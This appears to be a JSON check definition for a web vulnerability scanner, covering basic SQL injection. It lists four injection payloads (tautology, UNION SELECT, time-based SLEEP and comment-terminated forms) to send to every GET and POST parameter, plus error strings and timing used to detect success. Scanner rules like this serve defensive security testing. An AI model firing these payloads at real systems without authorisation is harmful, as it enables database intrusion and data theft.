{
    "id": "basic_sqli",
    "name": "Basic SQL Injection",
    "description": "Detects common SQL injection vulnerabilities using basic payloads.",
    "payloads": [
      "' OR '1'='1",
      "' UNION SELECT null,null,null--",
      "' AND SLEEP(5)--",
      "' OR 1=1--"
    ],
    "methods": ["GET", "POST"],
    "parameters": ["*"],
    "detect": {
      "errors": [
        "SQL syntax",
        "mysql_fetch",
        "unclosed quotation mark"
      ],
      "expectedOutput": "admin",
      "expectedResponseCode": 200,
      "delays": [5]
    }
  }
  